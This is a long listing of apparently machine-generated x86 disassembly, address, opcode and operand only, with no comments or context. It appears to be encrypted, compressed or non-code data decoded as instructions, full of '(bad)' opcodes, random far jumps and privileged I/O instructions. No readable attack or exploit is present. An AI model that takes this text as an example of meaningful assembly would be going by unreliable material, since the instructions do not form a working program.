  412943:	mov    DWORD PTR [ebx],eax
  412945:	(bad)  
  412946:	adc    eax,0xdb0a004e
  41294b:	fcmovnbe st,st(0)
  41294d:	dec    ebp
  41294e:	adc    DWORD PTR [edx-0x49bf1b21],ebp
  412954:	jbe    0x4129cd
  412956:	or     al,BYTE PTR [edi-0x65f2b8f3]
  41295c:	sub    esp,DWORD PTR [edx-0x376f1d5b]
  412962:	or     al,BYTE PTR [eax]
  412964:	iret   
  412965:	jge    0x412974
  412967:	push   0xad4d16be
  41296c:	push   eax
  41296d:	jns    0x4129c2
  41296f:	arpl   WORD PTR [ebx+eax*2-0x22d3471c],di
  412976:	(bad)  [ecx+0x4e]
  412979:	push   ss
  41297a:	jle    0x412965
  41297c:	sub    dh,dl
  41297e:	test   al,0x8f
  412980:	sub    dl,bl
  412982:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412983:	enter  0xb9b5,0xb2
  412987:	add    esi,esi
  412989:	mov    esp,0x17279a85
  41298e:	or     BYTE PTR [ebx],bh
  412990:	or     eax,0x414c7396
  412995:	retf   0x253b
  412998:	sbb    ch,ah
  41299a:	or     DWORD PTR [ebp+ebx*2+0x5f],eax
  41299e:	repnz inc edi
  4129a0:	add    eax,0x7cdd2512
  4129a5:	xchg   esi,eax
  4129a6:	sub    BYTE PTR [edx-0x737338d7],dl
  4129ac:	sbb    bl,BYTE PTR [edx+0x3b838ed0]
  4129b2:	xchg   BYTE PTR [ebx],bl
  4129b4:	cld    
  4129b5:	adc    eax,0xf0b472f9
  4129ba:	mov    ebx,0xeaee3893
  4129bf:	xchg   esp,eax
  4129c0:	ja     0x4129d2
  4129c2:	pop    ds
  4129c3:	xchg   ebx,eax
  4129c4:	mov    ds:0xc8c2699c,al
  4129c9:	push   ecx
  4129ca:	fsubr  st,st(4)
  4129cc:	xor    dh,al
  4129ce:	(bad)  
  4129cf:	mov    eax,0x6ec28876
  4129d4:	stos   BYTE PTR es:[edi],al
  4129d5:	push   es
  4129d6:	jns    0x4129b9
  4129d8:	jecxz  0x4129f3
  4129da:	cmp    DWORD PTR [ecx],ecx
  4129dc:	stos   DWORD PTR es:[edi],eax
  4129dd:	adc    al,0x18
  4129df:	jbe    0x412a11
  4129e1:	mov    esi,0x68613626
  4129e6:	and    ah,ch
  4129e8:	push   edi
  4129e9:	fistp  QWORD PTR [edx+edi*8-0x67]
  4129ed:	sbb    cl,ah
  4129ef:	jae    0x412a1b
  4129f1:	mov    bh,0x1
  4129f3:	ret    0xcf52
  4129f6:	jge    0x412980
  4129f8:	int    0x9f
  4129fa:	and    DWORD PTR [eax],esp
  4129fc:	mov    ah,0xac
  4129fe:	pop    esi
  4129ff:	or     BYTE PTR [ebx+0x19de3f67],ch
  412a05:	ins    BYTE PTR es:[edi],dx
  412a06:	cwde   
  412a07:	or     ebx,DWORD PTR [edi]
  412a09:	cwde   
  412a0a:	jle    0x412a62
  412a0c:	pop    ecx
  412a0d:	pop    edi
  412a0e:	iret   
  412a0f:	jmp    0x11da:0xcd88bc24
  412a16:	je     0x4129dd
  412a18:	mov    cl,0x81
  412a1a:	jp     0x412a44
  412a1c:	cmc    
  412a1d:	or     eax,DWORD PTR [ecx+0x45]
  412a20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a21:	push   eax
  412a22:	outs   dx,BYTE PTR ds:[esi]
  412a23:	(bad)  [ecx]
  412a25:	test   al,0x89
  412a27:	adc    al,BYTE PTR [esi]
  412a29:	pop    ds
  412a2a:	mov    DWORD PTR [edi],eax
  412a2c:	into   
  412a2d:	ss iret 
  412a2f:	std    
  412a30:	call   0xc592e578
  412a35:	sbb    eax,DWORD PTR [esi]
  412a37:	sbb    eax,0xb1825615
  412a3c:	daa    
  412a3d:	mov    esi,edi
  412a3f:	hlt    
  412a40:	sbb    DWORD PTR [ecx+0xd072b4e],esi
  412a46:	add    edx,esi
  412a48:	(bad)  
  412a49:	addr16 cmc 
  412a4b:	cmc    
  412a4c:	jge    0x412a2d
  412a4e:	neg    BYTE PTR [ecx+0x3c]
  412a51:	adc    BYTE PTR [edx-0x1e],dh
  412a54:	xor    al,0x46
  412a56:	sub    al,0xbf
  412a58:	push   cs
  412a59:	dec    ecx
  412a5a:	cmp    BYTE PTR [edx],dl
  412a5c:	add    eax,0xa81bffbb
  412a61:	inc    eax
  412a62:	test   al,0xa1
  412a64:	daa    
  412a65:	in     eax,0xda
  412a67:	ja     0x412a46
  412a69:	mov    DWORD PTR [edi-0x5b],ecx
  412a6c:	call   0xa8b4:0xd69570f9
  412a73:	aam    0x7d
  412a75:	mov    al,0x93
  412a77:	jmp    0x132ea23e
  412a7c:	inc    eax
  412a7d:	inc    ebx
  412a7e:	inc    ecx
  412a7f:	lock jle 0x412a50
  412a82:	mov    dh,0x50
  412a84:	adc    al,0x51
  412a86:	retf   0x5455
  412a89:	mov    esp,0xe82f533e
  412a8e:	cmp    BYTE PTR [ebp+0x490f24ba],ah
  412a94:	(bad)  
  412a95:	mov    ch,0x8
  412a97:	aad    0xe3
  412a99:	pop    edi
  412a9a:	loope  0x412aea
  412a9c:	(bad)  
  412a9d:	sub    BYTE PTR [esi-0x1e],dh
  412aa0:	inc    ebx
  412aa1:	repz jp 0x412a90
  412aa4:	clc    
  412aa5:	hlt    
  412aa6:	aam    0xb0
  412aa8:	push   ecx
  412aa9:	sbb    al,0x7
  412aab:	imul   edi,DWORD PTR [edi+0x3fa10329],0xa7c0782d
  412ab5:	jb     0x412b33
  412ab7:	pop    esp
  412ab8:	popf   
  412ab9:	ror    bl,0xa6
  412abc:	sub    DWORD PTR [ecx],ebx
  412abe:	mov    ds:0x21a71693,eax
  412ac3:	(bad)  
  412ac4:	ja     0x412ada
  412ac6:	rcr    BYTE PTR [ebx],0xbf
  412ac9:	xchg   cl,bl
  412acb:	sbb    DWORD PTR [esi+0x2f],esi
  412ace:	inc    ebp
  412acf:	push   ss
  412ad0:	xor    al,0xd
  412ad2:	xor    DWORD PTR [eax],0x9e701189
  412ad8:	stos   DWORD PTR es:[edi],eax
  412ad9:	jae    0x412a70
  412adb:	loope  0x412a85
  412add:	pop    ss
  412ade:	imul   eax,DWORD PTR [ebp-0x42],0x17910af9
  412ae5:	mov    cs:0xb58a1ede,eax
  412aeb:	arpl   WORD PTR [ebp-0x44],cx
  412aee:	mov    esi,0x6714d99c
  412af3:	div    DWORD PTR [esi]
  412af5:	sbb    BYTE PTR [esi+0x773151f6],0xad
  412afc:	ja     0x412b2a
  412afe:	mov    ah,0xdd
  412b00:	out    dx,eax
  412b01:	or     eax,0xec8936ea
  412b06:	stos   DWORD PTR es:[edi],eax
  412b07:	out    dx,eax
  412b08:	mov    ebx,0x60344057
  412b0d:	xchg   ecx,eax
  412b0e:	cmp    BYTE PTR [edx-0x258a1924],bh
  412b14:	jg     0x412aeb
  412b16:	leave  
  412b17:	sbb    BYTE PTR [esi-0x4a],dl
  412b1a:	pop    ss
  412b1b:	test   eax,0x428c17
  412b20:	int3   
  412b21:	jge    0x412b46
  412b23:	add    BYTE PTR [edx],dh
  412b25:	call   0xebeb9830
  412b2a:	push   ss
  412b2b:	imul   esp,DWORD PTR [ecx],0xfd10d8f
  412b31:	fnstenv [ebx]
  412b33:	cmp    edi,DWORD PTR [eax-0x48d7e460]
  412b39:	pop    ecx
  412b3a:	dec    ebp
  412b3b:	mov    cl,0x56
  412b3d:	and    al,BYTE PTR [edi-0x5c60e0ef]
  412b43:	rcr    BYTE PTR ds:0x93045f40,0xb9
  412b4a:	dec    ebx
  412b4b:	or     eax,ecx
  412b4d:	mov    ecx,0x6fab63ba
  412b52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412b53:	bound  ebp,QWORD PTR ds:0x6545cfba
  412b59:	xchg   ecx,eax
  412b5a:	add    al,0x17
  412b5c:	mov    bh,0x2b
  412b5e:	sti    
  412b5f:	loope  0x412b11
  412b61:	pop    ebp
  412b62:	push   ebp
  412b63:	inc    esp
  412b64:	push   esp
  412b65:	pop    esi
  412b66:	sahf   
  412b67:	sar    DWORD PTR [edi],cl
  412b69:	or     cl,BYTE PTR [eax]
  412b6b:	(bad)  
  412b6c:	out    dx,al
  412b6d:	add    esi,edi
  412b6f:	and    DWORD PTR [ecx-0x1d016253],esp
  412b75:	inc    ebx
  412b76:	stos   DWORD PTR es:[edi],eax
  412b77:	cmp    ch,al
  412b79:	pop    ds
  412b7a:	pusha  
  412b7b:	ins    BYTE PTR es:[edi],dx
  412b7c:	jbe    0x412b04
  412b7e:	mov    ds:0xec5f8c03,eax
  412b83:	mov    ebp,0xddbfbfb7
  412b88:	sbb    DWORD PTR [ecx+ecx*1],ecx
  412b8b:	retf   0x74c1
  412b8e:	inc    eax
  412b8f:	aas    
  412b90:	cwde   
  412b91:	dec    edx
  412b92:	stc    
  412b93:	les    ebp,FWORD PTR [ebx+0x20]
  412b96:	jmp    0x412bf4
  412b98:	retf   
  412b99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412b9a:	adc    DWORD PTR [ebx],esi
  412b9c:	sbb    edi,DWORD PTR es:0xc405f0ac
  412ba3:	mov    ebp,0xa0ece5f5
  412ba8:	(bad)  
  412baa:	jbe    0x412b8e
  412bac:	fcomp  DWORD PTR [ecx]
  412bae:	std    
  412baf:	cmp    ah,dl
  412bb1:	dec    ah
  412bb3:	nop
  412bb4:	jns    0x412bf9
  412bb6:	jbe    0x412bb4
  412bb8:	mov    esi,0x6cf3fb44
  412bbd:	and    BYTE PTR [ebp-0x34],0xfc
  412bc1:	shr    BYTE PTR ds:0xf0908953,cl
  412bc7:	repz xchg ecx,eax
  412bc9:	(bad)  
  412bca:	sub    DWORD PTR [edi+0xd],ebp
  412bcd:	inc    eax
  412bce:	stos   BYTE PTR es:[edi],al
  412bcf:	inc    edx
  412bd0:	retf   0x598
  412bd3:	dec    ecx
  412bd4:	test   eax,0xf7ab4581
  412bd9:	call   DWORD PTR [edi-0x425a2c03]
  412bdf:	lock mov edx,0xc903f1b4
  412be5:	scas   al,BYTE PTR es:[edi]
  412be6:	fmul   DWORD PTR [esi+0x30709874]
  412bec:	pop    eax
  412bed:	fcom   QWORD PTR [ebx+0x6310a399]
  412bf3:	clc    
  412bf4:	or     dh,BYTE PTR [edi-0x7860d3e8]
  412bfa:	mov    al,0x75
  412bfc:	shl    DWORD PTR [ecx+0x13254253],0xe3
  412c03:	mov    ds:0x3ca0ff84,eax
  412c08:	and    edi,DWORD PTR [edi+0x7f1fa66b]
  412c0e:	test   esp,edi
  412c10:	and    DWORD PTR [esi+eiz*2-0x5f119a9f],ebx
  412c17:	mov    al,0x76
  412c19:	cdq    
  412c1a:	fidivr DWORD PTR [edx]
  412c1c:	jle    0x412c0e
  412c1e:	mov    ebp,0x7a2a1dc4
  412c23:	aaa    
  412c24:	loopne 0x412c6a
  412c26:	callw  0x4d28
  412c2a:	xchg   DWORD PTR [ebx],ebx
  412c2c:	mov    ds:0x87b7b2c,al
  412c31:	mov    dl,0x18
  412c33:	test   al,0x89
  412c35:	inc    edx
  412c36:	sbb    eax,0x2dd11a00
  412c3b:	pusha  
  412c3c:	dec    edx
  412c3d:	call   0x299a7d5f
  412c42:	fiadd  DWORD PTR [eax-0x58c1ce6]
  412c48:	adc    eax,0xb9c43b5a
  412c4d:	mov    ds:0xa2bbc52c,eax
  412c52:	popf   
  412c53:	push   0xf7b6a3b0
  412c58:	adc    cl,BYTE PTR [edi+0x59]
  412c5b:	scas   al,BYTE PTR es:[edi]
  412c5c:	addr16 dec ecx
  412c5e:	pop    edx
  412c5f:	mov    ds:0x9eba2256,eax
  412c64:	or     dl,ah
  412c66:	push   ebx
  412c67:	jo     0x412bf6
  412c69:	mov    ebp,0xaf043c0b
  412c6e:	das    
  412c6f:	clc    
  412c70:	shr    dl,cl
  412c72:	push   esp
  412c73:	clc    
  412c74:	push   ebx
  412c75:	pop    ebp
  412c76:	stc    
  412c77:	xchg   esp,eax
  412c79:	adc    BYTE PTR [eax*1-0x76eb1bb1],cl
  412c80:	ficom  WORD PTR [esi]
  412c82:	lock xchg ebp,eax
  412c84:	and    al,0xa8
  412c86:	ss mov edi,0xe4a34b50
  412c8c:	and    eax,0x67cf8547
  412c91:	cwde   
  412c92:	out    0x1c,al
  412c94:	mov    BYTE PTR [ecx+0x73],dh
  412c97:	popf   
  412c98:	sub    eax,0xe60cc686
  412c9d:	aaa    
  412c9e:	sub    BYTE PTR [ecx-0x2e],ch
  412ca1:	sbb    al,0xb8
  412ca3:	fst    QWORD PTR [ebp+0x1]
  412ca6:	lds    edi,FWORD PTR [ecx+eax*1-0x1119ed85]
  412cad:	mov    edx,0x636b2f19
  412cb2:	push   0xcf5ef184
  412cb7:	push   edx
  412cb8:	sbb    bl,BYTE PTR [ebx]
  412cba:	gs into 
  412cbc:	in     al,0xfa
  412cbe:	sbb    BYTE PTR ds:0xb8fc6db,al
  412cc4:	mov    bl,0xd9
  412cc6:	(bad)  
  412cc7:	xchg   esi,eax
  412cc8:	cmp    edi,DWORD PTR [ebx-0x78c92a34]
  412cce:	add    eax,0x714c121e
  412cd3:	and    eax,0x63052f7e
  412cd8:	or     ebx,DWORD PTR [esi+0x55]
  412cdb:	das    
  412cdc:	jmp    0x412d3e
  412cde:	pop    eax
  412cdf:	test   BYTE PTR ds:0x456969a5,al
  412ce5:	enter  0x8ad7,0x8e
  412ce9:	cs inc ebx
  412ceb:	cmp    dl,BYTE PTR [esp+eax*4-0x36]
  412cef:	bound  edx,QWORD PTR [edx-0x7d]
  412cf2:	lods   al,BYTE PTR ds:[esi]
  412cf3:	mov    eax,ds:0x14a5de8a
  412cf8:	pop    ds
  412cf9:	push   edi
  412cfa:	sub    bl,BYTE PTR [ecx]
  412cfc:	sbb    edi,DWORD PTR [esi+0x3c]
  412cff:	inc    esp
  412d00:	or     edx,eax
  412d02:	add    al,0xdb
  412d04:	int    0x46
  412d06:	adc    esi,DWORD PTR [edx]
  412d08:	mov    ecx,0xd58573af
  412d0d:	in     eax,0x56
  412d0f:	aad    0x91
  412d11:	test   eax,0x7418643b
  412d16:	sti    
  412d17:	cli    
  412d18:	xor    dh,0xca
  412d1b:	and    al,0x5d
  412d1d:	out    0x1a,eax
  412d1f:	std    
  412d20:	mov    ch,0x52
  412d22:	pop    esp
  412d23:	(bad)  
  412d24:	jecxz  0x412d24
  412d26:	cli    
  412d27:	clc    
  412d28:	in     eax,dx
  412d29:	rcl    DWORD PTR [edx-0x63],1
  412d2c:	adc    al,0xd5
  412d2e:	add    DWORD PTR [ebx+ebx*8+0x7f],eax
  412d32:	fidiv  WORD PTR [esp+eax*1+0x5b]
  412d36:	cli    
  412d37:	clc    
  412d38:	test   DWORD PTR [edi+0x0],ecx
  412d3b:	daa    
  412d3c:	jo     0x412dac
  412d3e:	jmp    0x2cf0:0xbb206734
  412d45:	enter  0xf994,0x6f
  412d49:	fst    QWORD PTR [esi+0x7d1c59d5]
  412d4f:	out    dx,eax
  412d50:	push   0xfffffff9
  412d52:	pop    ds
  412d53:	shr    BYTE PTR [esi-0xd16738a],cl
  412d59:	sbb    DWORD PTR [edx-0x1b8609fb],esi
  412d5f:	cmp    al,0xfd
  412d61:	add    bh,0xa9
  412d64:	loopne 0x412dba
  412d66:	(bad)  
  412d67:	fs out 0x4e,al
  412d6a:	in     al,dx
  412d6b:	stc    
  412d6c:	cmp    al,0xa
  412d6e:	mov    ch,0x17
  412d70:	push   ecx
  412d71:	inc    ebx
  412d72:	xor    dl,BYTE PTR [eax-0x38]
  412d75:	inc    esi
  412d76:	stos   BYTE PTR es:[edi],al
  412d77:	jmp    0xdfb8:0x7707fe2a
  412d7e:	or     al,0x38
  412d80:	pop    ebx
  412d81:	(bad)  
  412d82:	pop    ebp
  412d83:	jb     0x412d74
  412d85:	mov    bh,dh
  412d87:	push   esi
  412d88:	pop    edx
  412d89:	inc    ebp
  412d8a:	mov    dh,0xfb
  412d8c:	or     eax,0x728606d4
  412d91:	call   0xf56df9fa
  412d96:	lock cdq 
  412d98:	dec    edx
  412d9a:	and    esi,edx
  412d9c:	push   eax
  412d9d:	jns    0x412e12
  412d9f:	adc    al,0xd7
  412da1:	jmp    0x5bcb:0x60fac359
  412da8:	js     0x412d81
  412daa:	mov    bh,0x71
  412dac:	cmp    eax,0xbd54f6a7
  412db1:	repnz dec edx
  412db3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412db4:	xchg   ebx,eax
  412db5:	mov    al,0x35
  412db7:	adc    BYTE PTR [ebp+0x5cf784aa],al
  412dbd:	test   BYTE PTR [ebp-0x14c3a0b9],0x5
  412dc4:	scas   al,BYTE PTR es:[edi]
  412dc5:	mov    dl,0xb9
  412dc7:	minps  xmm4,XMMWORD PTR [edi-0xb4864b1]
  412dce:	mov    bl,0x54
  412dd0:	pop    DWORD PTR [ebp-0x6751f23f]
  412dd6:	or     al,0xe2
  412dd8:	cmp    eax,0x620631b1
  412ddd:	(bad)  
  412dde:	outs   dx,DWORD PTR ds:[esi]
  412ddf:	cmp    DWORD PTR [edx-0x62],edi
  412de2:	jns    0x412dcc
  412de4:	fist   WORD PTR [esi+0x45f79b5a]
  412dea:	xor    eax,0xd7edc564
  412def:	inc    eax
  412df0:	adc    BYTE PTR [edi+0x6725657e],dh
  412df6:	test   al,0x1b
  412df8:	cmp    ah,ah
  412dfa:	enter  0x6571,0x2f
  412dfe:	or     bh,BYTE PTR [eax+edx*4]
  412e01:	push   es
  412e02:	cld    
  412e03:	sbb    bh,ah
  412e05:	xchg   esp,eax
  412e06:	call   0x8983:0x69c4b9dc
  412e0d:	pop    ss
  412e0e:	shl    BYTE PTR [esi],0xe6
  412e11:	push   ecx
  412e12:	es dec ecx
  412e14:	xor    eax,0xf3257c30
  412e19:	jne    0x412e0c
  412e1b:	cs out dx,al
  412e1d:	or     ebp,DWORD PTR [ecx]
  412e1f:	mov    bh,cl
  412e21:	cdq    
  412e22:	out    0xab,al
  412e24:	lea    edx,[eax+0x1b]
  412e27:	mov    ebp,0x53f6af52
  412e2c:	push   edi
  412e2d:	call   0xcac5:0xc661d37
  412e34:	nop
  412e35:	arpl   WORD PTR [edx-0x4cfb511b],si
  412e3b:	in     al,dx
  412e3c:	outs   dx,DWORD PTR ds:[esi]
  412e3d:	add    ah,BYTE PTR [edx]
  412e3f:	jp     0x412df7
  412e41:	clc    
  412e42:	jle    0x412e20
  412e44:	mov    WORD PTR [ecx-0xb],?
  412e47:	js     0x412e88
  412e49:	jle    0x412e72
  412e4b:	aam    0x91
  412e4d:	push   esi
  412e4e:	fnsave [ebx+0x7fd535a1]
  412e54:	gs cmp al,0x7c
  412e57:	sub    eax,0x185f2b12
  412e5c:	mov    ds:0x5eb94e96,al
  412e61:	fs jae 0x412de4
  412e64:	jecxz  0x412e4d
  412e66:	dec    ebx
  412e67:	xchg   edi,eax
  412e68:	pop    ebx
  412e69:	pop    ebp
  412e6a:	mov    al,dl
  412e6c:	jp     0x412eeb
  412e6e:	enter  0xb6dd,0xa9
  412e72:	aaa    
  412e73:	pop    ebp
  412e74:	xchg   ebp,eax
  412e75:	mov    ss,WORD PTR [edx+ecx*4+0x61]
  412e79:	stos   BYTE PTR es:[edi],al
  412e7a:	push   edx
  412e7b:	addr16 xchg ecx,eax
  412e7d:	icebp  
  412e7e:	enter  0x8b03,0x2a
  412e82:	mov    DWORD PTR [edx-0x5b7138aa],0x3bbb04fd
  412e8c:	std    
  412e8d:	adc    ch,0x2b
  412e90:	sti    
  412e91:	lea    ecx,[eax-0x75]
  412e94:	pop    edi
  412e95:	test   BYTE PTR [ebp-0x34395653],bl
  412e9b:	jp     0x412e37
  412e9d:	into   
  412e9e:	nop
  412e9f:	cmp    BYTE PTR [esp+eax*8+0x6d],ch
  412ea3:	push   ss
  412ea4:	jne    0x412eaf
  412ea6:	aas    
  412ea7:	ss call esi
  412eaa:	test   al,0x5d
  412eac:	jb     0x412ec2
  412eae:	xchg   ecx,eax
  412eaf:	scas   al,BYTE PTR es:[edi]
  412eb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412eb1:	jmp    0xedb5:0xa5c0c118
  412eb8:	jns    0x412ece
  412eba:	jo     0x412e6f
  412ebc:	push   ss
  412ebd:	cmp    edx,0x16
  412ec0:	or     ah,BYTE PTR [ebp-0x47]
  412ec3:	dec    esi
  412ec4:	adc    BYTE PTR [eax-0x1c0a8ff4],dh
  412eca:	in     eax,dx
  412ecb:	pop    ds
  412ecc:	std    
  412ecd:	and    ecx,ecx
  412ecf:	aad    0x5e
  412ed1:	jl     0x412ef9
  412ed3:	aad    0x3f
  412ed5:	les    edi,FWORD PTR [ecx]
  412ed7:	aam    0xa1
  412ed9:	loopne 0x412f51
  412edb:	push   edx
  412edc:	fadd   DWORD PTR [eax-0x20]
  412edf:	sub    al,0xd5
  412ee1:	cmp    al,0xb1
  412ee3:	hlt    
  412ee4:	fidiv  WORD PTR [ebp+0x3a7b6edd]
  412eea:	lds    esp,FWORD PTR [ebx]
  412eec:	or     eax,0xd1fe4e11
  412ef1:	mov    ebx,0xe02412ce
  412ef6:	mov    bh,0xe7
  412ef8:	dec    edx
  412ef9:	in     al,dx
  412efa:	fidivr WORD PTR [ecx-0x5035ab24]
  412f00:	xchg   ebp,eax
  412f01:	fcomp  DWORD PTR [ebx-0x207b8f11]
  412f07:	cmp    bl,dl
  412f09:	(bad)  
  412f0a:	mov    al,0xb8
  412f0c:	jae    0x412f62
  412f0e:	mov    al,0x92
  412f10:	or     BYTE PTR [edi-0x1],0xc2
  412f14:	ins    DWORD PTR es:[edi],dx
  412f15:	mov    edi,0xbf8d980c
  412f1a:	pop    ebp
  412f1b:	adc    al,0x30
  412f1d:	dec    ecx
  412f1e:	arpl   bx,sp
  412f20:	aas    
  412f21:	in     eax,dx
  412f22:	(bad)  
  412f23:	js     0x412f4a
  412f25:	mov    gs,ebx
  412f27:	jno    0x412f7d
  412f29:	sub    DWORD PTR ds:[edi-0x8e62b5],ecx
  412f30:	jmp    0x10585bd7
  412f35:	pop    eax
  412f36:	add    al,BYTE PTR [esi+0x5fad2132]
  412f3c:	call   0x6b9a:0x8c087f2b
  412f43:	cmp    esp,ecx
  412f45:	pop    esp
  412f46:	inc    esi
  412f47:	mov    edi,0xce687585
  412f4c:	sub    DWORD PTR [edx+0x5036f5d8],esi
  412f52:	xchg   ecx,eax
  412f53:	shr    BYTE PTR [esi-0x1acc6a6c],0x8a
  412f5a:	push   cs
  412f5b:	in     al,0xb6
  412f5d:	test   DWORD PTR [edx+0x3],edi
  412f60:	dec    esi
  412f61:	and    ebx,DWORD PTR [ebp-0x571057c6]
  412f67:	ja     0x412fbf
  412f69:	inc    esp
  412f6a:	adc    ebp,DWORD PTR [edi+0x72]
  412f6d:	ins    BYTE PTR es:[edi],dx
  412f6e:	or     al,0x82
  412f70:	es pop esp
  412f72:	dec    ebp
  412f73:	jbe    0x412f0e
  412f75:	push   ds
  412f76:	mov    WORD PTR [edi-0xe],es
  412f79:	dec    ecx
  412f7a:	call   0xedc1:0xedc1fabe
  412f81:	(bad)  [edi]
  412f83:	out    0x94,eax
  412f85:	or     ebx,0xe7a90227
  412f8b:	ins    DWORD PTR es:[edi],dx
  412f8c:	xor    DWORD PTR [ebx-0x3de15b19],ebp
  412f92:	shr    edi,cl
  412f94:	scas   al,BYTE PTR es:[edi]
  412f95:	lahf   
  412f96:	add    BYTE PTR [ebp+0x1f5875ff],cl
  412f9c:	adc    DWORD PTR [ebx+0x7e63e463],ebx
  412fa2:	pop    edx
  412fa3:	sahf   
  412fa4:	and    ebx,DWORD PTR [ecx+0x4a]
  412fa7:	das    
  412fa8:	xchg   ecx,eax
  412fa9:	mov    ah,0xc1
  412fab:	cmp    eax,esp
  412fad:	popa   
  412fae:	or     al,0x85
  412fb0:	outs   dx,DWORD PTR ds:[esi]
  412fb1:	mov    eax,esp
  412fb3:	xchg   edx,eax
  412fb5:	fwait
  412fb6:	mov    cl,ch
  412fb8:	ror    BYTE PTR [esi],0x9c
  412fbb:	sub    eax,0x20207c5
  412fc0:	jge    0x412ffa
  412fc2:	mov    edx,0x2caf3afc
  412fc7:	xlat   BYTE PTR ds:[ebx]
  412fc8:	mov    edx,0xdd53f1e3
  412fcd:	rol    BYTE PTR [edi-0x50],1
  412fd0:	push   0x47
  412fd2:	adc    ebx,DWORD PTR [ebx]
  412fd4:	dec    ebx
  412fd5:	push   edx
  412fd6:	gs pop edi
  412fd8:	es mov cl,0x3e
  412fdb:	push   ebp
  412fdc:	mov    ah,0xf0
  412fde:	and    al,0x20
  412fe0:	jmp    0xce62bfd
  412fe5:	mov    al,0x80
  412fe7:	push   ebx
  412fe8:	xor    ch,BYTE PTR [edi+esi*4-0x131b709e]
  412fef:	push   edi
  412ff0:	scas   al,BYTE PTR es:[edi]
  412ff1:	cmp    DWORD PTR [edx],esp
  412ff3:	test   DWORD PTR [ebx-0x46e01ee5],ebp
  412ff9:	mov    ds:0xeefd3599,al
  412ffe:	add    bh,BYTE PTR [edx-0x7c]
  413001:	std    
  413002:	sub    eax,0x3ec41ba7
  413007:	dec    BYTE PTR [edx+edx*8-0x17c3732c]
  41300e:	ja     0x413062
  413010:	das    
  413011:	dec    eax
  413012:	hlt    
  413013:	push   esp
  413014:	add    eax,0xd517fd0f
  413019:	xchg   edx,eax
  41301a:	push   edi
  41301b:	lods   al,BYTE PTR ds:[esi]
  41301c:	aas    
  41301d:	sub    BYTE PTR [edi],0xc9
  413020:	sbb    ah,BYTE PTR [ebx+0x68]
  413023:	push   esi
  413024:	jge    0x413054
  413026:	mov    bh,0xb4
  413028:	xchg   edx,eax
  413029:	shl    DWORD PTR [ecx+0x707456ed],1
  41302f:	adc    ch,BYTE PTR [eax+ecx*4+0x50a1197e]
  413036:	pop    edi
  413037:	xchg   DWORD PTR [esi],esi
  413039:	mov    bh,0x6b
  41303b:	inc    esp
  41303c:	xor    BYTE PTR [edi+0x440354d],0xf8
  413043:	jle    0x41303c
  413045:	fst    QWORD PTR [eax-0x6c585039]
  41304b:	fmul   DWORD PTR [ecx+0x6b]
  41304e:	loopne 0x413089
  413050:	lock mov DWORD PTR [esi+0x402a8790],edi
  413057:	(bad)  
  413058:	pop    edx
  413059:	mov    ah,0x19
  41305b:	stc    
  41305c:	jnp    0x4130d4
  41305e:	dec    esi
  41305f:	rcr    esi,1
  413061:	fiadd  WORD PTR [edi-0x72a17914]
  413067:	stos   DWORD PTR es:[edi],eax
  413068:	push   edi
  413069:	xor    eax,eax
  41306b:	add    eax,edx
  41306d:	sub    ebp,eax
  41306f:	cld    
  413070:	mov    al,ds:0x1a9ece8d
  413075:	mov    ecx,esp
  413077:	stos   BYTE PTR es:[edi],al
  413078:	dec    eax
  413079:	or     ecx,DWORD PTR [edi-0x34]
  41307c:	cwde   
  41307d:	(bad)  
  41307e:	pop    ds
  41307f:	js     0x4130bb
  413081:	das    
  413082:	outs   dx,BYTE PTR ds:[esi]
  413083:	lods   eax,DWORD PTR ds:[esi]
  413084:	xor    al,0x8f
  413086:	or     al,0x25
  413088:	push   ecx
  413089:	and    eax,0xc489a1ab
  41308e:	adc    eax,0x2d3f7922
  413093:	loope  0x41307a
  413095:	sub    DWORD PTR [ebp-0x2],ebx
  413098:	sti    
  413099:	js     0x4130c7
  41309b:	push   esp
  41309c:	sub    DWORD PTR [edx],ebx
  41309e:	clc    
  41309f:	stos   BYTE PTR es:[edi],al
  4130a0:	sub    al,0x67
  4130a2:	jb     0x4130fd
  4130a4:	dec    ecx
  4130a5:	xor    BYTE PTR [ebx-0xb],cl
  4130a8:	sbb    eax,0xec574b36
  4130ad:	xor    dl,BYTE PTR [ecx]
  4130af:	fmul   DWORD PTR [ebp+ebp*8+0x3e4e2501]
  4130b6:	or     bl,BYTE PTR [ecx-0x165cfa09]
  4130bc:	bound  esp,QWORD PTR [edx+0x466bdc1a]
  4130c2:	imul   ebp,DWORD PTR [eax+0x34d27b89],0x8163f247
  4130cc:	jge    0x4130a0
  4130ce:	fild   QWORD PTR [ebx+0x72]
  4130d1:	adc    DWORD PTR [esi+esi*4],ebx
  4130d4:	fidiv  DWORD PTR [eax]
  4130d6:	xor    ebp,0x40188220
  4130dc:	stos   BYTE PTR es:[edi],al
  4130dd:	ds jbe 0x413149
  4130e0:	fst    DWORD PTR [ebp-0x4b]
  4130e3:	rcr    DWORD PTR [edx-0x65142d5a],cl
  4130e9:	out    dx,al
  4130ea:	sub    al,0x3d
  4130ec:	in     al,0xee
  4130ee:	mov    bl,0x39
  4130f0:	push   es
  4130f1:	aad    0x20
  4130f3:	xor    al,dl
  4130f5:	aas    
  4130f6:	cmp    al,0x57
  4130f8:	sbb    eax,0x6d017d43
  4130fd:	outs   dx,BYTE PTR ds:[esi]
  4130fe:	and    edi,DWORD PTR [eax+0x3b77f35b]
  413104:	adc    ch,BYTE PTR [edi+0x37]
  413107:	out    dx,al
  413108:	xor    ebx,DWORD PTR [edx]
  41310a:	xchg   ebx,eax
  41310b:	inc    ebx
  41310c:	aas    
  41310d:	jecxz  0x4130c0
  41310f:	add    DWORD PTR [ecx+0x3b6f122a],ebp
  413115:	shl    dh,0xc1
  413118:	gs adc dl,cl
  41311b:	pop    ss
  41311c:	pop    eax
  41311d:	in     eax,0x95
  41311f:	adc    al,0x7d
  413121:	mov    ds:0xbf1294ba,al
  413126:	mov    edi,0xf9e9db35
  41312b:	in     al,dx
  41312c:	adc    esp,0x34b1ed6b
  413132:	das    
  413133:	into   
  413134:	mov    ch,0x18
  413136:	test   eax,0x5ca32d8
  41313b:	mov    eax,ds:0xabe82fd5
  413140:	into   
  413141:	xchg   edi,eax
  413142:	arpl   WORD PTR [edx+eiz*2+0x44],dx
